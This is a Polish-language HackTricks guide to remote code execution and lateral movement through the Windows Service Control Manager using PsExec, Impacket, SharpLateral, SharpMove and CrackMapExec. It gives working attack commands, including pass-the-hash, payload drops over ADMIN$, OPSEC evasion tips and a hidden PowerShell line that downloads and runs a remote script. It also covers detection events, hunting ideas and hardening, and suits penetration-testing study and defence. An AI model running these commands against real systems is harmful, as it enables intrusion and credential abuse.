# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

Te techniki wykorzystują Menedżera Kontroli Usług Windows (SCM) zdalnie przez SMB/RPC do wykonywania poleceń na docelowym hoście. Typowy przebieg to:

1. Uwierzytelnienie do celu i dostęp do udziału ADMIN$ przez SMB (TCP/445).
2. Skopiowanie pliku wykonywalnego lub określenie linii poleceń LOLBAS, którą usługa uruchomi.
3. Zdalne utworzenie usługi za pomocą SCM (MS-SCMR przez \PIPE\svcctl) wskazującej na to polecenie lub binarny plik.
4. Uruchomienie usługi w celu wykonania ładunku i opcjonalnie przechwycenie stdin/stdout przez nazwany potok.
5. Zatrzymanie usługi i sprzątanie (usunięcie usługi i wszelkich zrzucanych binarnych plików).

Wymagania/wymogi wstępne:
- Lokalny administrator na docelowym hoście (SeCreateServicePrivilege) lub wyraźne prawa do tworzenia usług na docelowym hoście.
- SMB (445) dostępny i udział ADMIN$ dostępny; zdalne zarządzanie usługami dozwolone przez zaporę hosta.
- Ograniczenia UAC dla zdalnych: w przypadku lokalnych kont, filtrowanie tokenów może blokować dostęp administratora przez sieć, chyba że używa się wbudowanego Administratora lub LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: użycie nazwy hosta/FQDN umożliwia Kerberos; łączenie przez IP często wraca do NTLM (i może być zablokowane w wzmocnionych środowiskach).

### Ręczne ScExec/WinExec za pomocą sc.exe

Poniżej przedstawiono minimalne podejście do tworzenia usługi. Obraz usługi może być zrzucanym EXE lub LOLBAS, takim jak cmd.exe lub powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notatki:
- Oczekuj błędu timeout przy uruchamianiu EXE, które nie jest usługą; wykonanie nadal się odbywa.
- Aby pozostać bardziej przyjaznym dla OPSEC, preferuj polecenia bezplikowe (cmd /c, powershell -enc) lub usuń zrzucane artefakty.

Znajdź bardziej szczegółowe kroki w: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Narzędzia i przykłady

### Sysinternals PsExec.exe

- Klasyczne narzędzie administracyjne, które używa SMB do zrzucania PSEXESVC.exe w ADMIN$, instaluje tymczasową usługę (domyślna nazwa PSEXESVC) i pośredniczy w I/O przez nazwane potoki.
- Przykłady użycia:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Możesz uruchomić bezpośrednio z Sysinternals Live za pomocą WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Zostawia zdarzenia instalacji/odinstalacji usługi (nazwa usługi często PSEXESVC, chyba że użyto -r) i tworzy C:\Windows\PSEXESVC.exe podczas wykonywania.

### Impacket psexec.py (podobny do PsExec)

- Używa osadzonej usługi podobnej do RemCom. Zrzuca tymczasowy plik binarny usługi (zwykle z losową nazwą) przez ADMIN$, tworzy usługę (domyślnie często RemComSvc) i przekazuje I/O przez nazwany potok.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakty
- Tymczasowy EXE w C:\Windows\ (losowe 8 znaków). Nazwa usługi domyślnie to RemComSvc, chyba że zostanie nadpisana.

### Impacket smbexec.py (SMBExec)

- Tworzy tymczasową usługę, która uruchamia cmd.exe i używa nazwanej rury do I/O. Zazwyczaj unika zrzucania pełnego ładunku EXE; wykonanie polecenia jest półinteraktywne.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral i SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementuje kilka metod ruchu lateralnego, w tym exec oparty na usłudze.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) zawiera modyfikację/tworzenie usługi w celu zdalnego wykonania polecenia.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Możesz również użyć CrackMapExec do wykonania za pomocą różnych backendów (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, wykrywanie i artefakty

Typowe artefakty hosta/sieci przy użyciu technik podobnych do PsExec:
- Zdarzenia zabezpieczeń 4624 (Typ logowania 3) i 4672 (Specjalne uprawnienia) na docelowym koncie administratora.
- Zdarzenia zabezpieczeń 5140/5145 dotyczące udostępniania plików i szczegółowe zdarzenia udostępniania plików pokazujące dostęp do ADMIN$ oraz tworzenie/zapisywanie binariów usług (np. PSEXESVC.exe lub losowe 8-znakowe .exe).
- Instalacja usługi zabezpieczeń 7045 na docelowym: nazwy usług takie jak PSEXESVC, RemComSvc lub niestandardowe (-r / -service-name).
- Sysmon 1 (Utworzenie procesu) dla services.exe lub obrazu usługi, 3 (Połączenie sieciowe), 11 (Utworzenie pliku) w C:\Windows\, 17/18 (Rura utworzona/połączona) dla rur takich jak \\.\pipe\psexesvc, \\.\pipe\remcom_*, lub zrandomizowane odpowiedniki.
- Artefakt rejestru dla EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hoście operatora (jeśli nie jest tłumione).

Pomysły na polowanie
- Powiadomienie o instalacjach usług, gdzie ImagePath zawiera cmd.exe /c, powershell.exe lub lokalizacje TEMP.
- Szukaj tworzenia procesów, gdzie ParentImage to C:\Windows\PSEXESVC.exe lub dzieci services.exe działających jako LOCAL SYSTEM wykonujących powłokę.
- Oznaczaj nazwane rury kończące się na -stdin/-stdout/-stderr lub znane nazwy rur klonów PsExec.

## Rozwiązywanie typowych problemów
- Odmowa dostępu (5) podczas tworzenia usług: brak prawdziwego lokalnego administratora, ograniczenia UAC dla lokalnych kont lub ochrona przed manipulacją EDR na ścieżce binariów usługi.
- Ścieżka sieciowa nie została znaleziona (53) lub nie można połączyć się z ADMIN$: zapora blokująca SMB/RPC lub wyłączone udostępnianie administratora.
- Kerberos nie działa, ale NTLM jest zablokowany: połącz się używając nazwy hosta/FQDN (nie IP), upewnij się, że SPN są poprawne, lub dostarcz -k/-no-pass z biletami przy użyciu Impacket.
- Rozpoczęcie usługi przekracza czas, ale ładunek działał: oczekiwane, jeśli nie jest to prawdziwy plik binarny usługi; przechwyć wyjście do pliku lub użyj smbexec do bieżącego I/O.

## Notatki dotyczące zabezpieczeń (nowoczesne zmiany)
- Windows 11 24H2 i Windows Server 2025 wymagają podpisywania SMB domyślnie dla połączeń wychodzących (i Windows 11 przychodzących). Nie wpływa to na legalne użycie PsExec z ważnymi poświadczeniami, ale zapobiega nadużywaniu niepodpisanego SMB relay i może wpłynąć na urządzenia, które nie obsługują podpisywania.
- Nowe blokowanie NTLM klienta SMB (Windows 11 24H2/Server 2025) może uniemożliwić fallback NTLM przy łączeniu przez IP lub do serwerów nie-Kerberos. W zabezpieczonych środowiskach to złamie oparte na NTLM PsExec/SMBExec; użyj Kerberos (nazwa hosta/FQDN) lub skonfiguruj wyjątki, jeśli jest to rzeczywiście potrzebne.
- Zasada najmniejszych uprawnień: minimalizuj członkostwo lokalnych administratorów, preferuj Just-in-Time/Just-Enough Admin, egzekwuj LAPS i monitoruj/powiadamiaj o instalacjach usług 7045.

## Zobacz także

- WMI-based remote exec (często bardziej bezplikowe):
{{#ref}}
lateral-movement/wmiexec.md
{{#endref}}

- WinRM-based remote exec:
{{#ref}}
lateral-movement/winrm.md
{{#endref}}



## Odniesienia

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Zabezpieczenia SMB w Windows Server 2025 i Windows 11 (podpisywanie domyślnie, blokowanie NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
